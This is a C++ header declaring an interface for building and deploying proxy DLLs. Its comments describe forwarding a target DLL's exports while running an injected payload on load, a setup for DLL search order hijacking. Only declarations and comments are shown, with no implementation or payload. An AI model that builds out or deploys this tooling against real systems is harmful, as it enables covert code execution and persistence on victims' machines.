#pragma once

#include <windows.h>

// DLL Proxy Loader (2025 technique)
//
// Creates a proxy DLL that forwards all exports from the original DLL
// while also executing a payload. This enables DLL search order hijacking
// without breaking the target application's functionality.
//
// The proxy DLL:
// 1. Loads the real DLL from its original location
// 2. Forwards all function calls to the real DLL
// 3. Executes the injected payload in DLL_PROCESS_ATTACH
//
// This module generates the forwarding infrastructure at runtime.

namespace DllProxy {

struct ProxyConfig {
    const wchar_t* targetDllName;       // DLL to proxy (e.g., L"version.dll")
    const wchar_t* realDllPath;         // Full path to the real DLL
    const void* payload;                // Payload to execute on attach
    size_t payloadSize;
};

// Build a proxy DLL in memory that forwards all exports from the target
// and includes the given payload. Returns a buffer containing the PE file.
// The caller must free the returned buffer with VirtualFree.
PVOID BuildProxyDll(const ProxyConfig& config, size_t* pOutputSize);

// Deploy a proxy DLL to the specified directory, enabling DLL search
// order hijacking for the target application.
bool DeployProxy(const ProxyConfig& config, const wchar_t* deployPath);

// Remove a previously deployed proxy DLL.
bool RemoveProxy(const wchar_t* proxyPath);

// Get the system directory path for a given DLL (where the real DLL lives).
bool GetRealDllPath(const wchar_t* dllName, wchar_t* pathOut, size_t pathLen);

} // namespace DllProxy
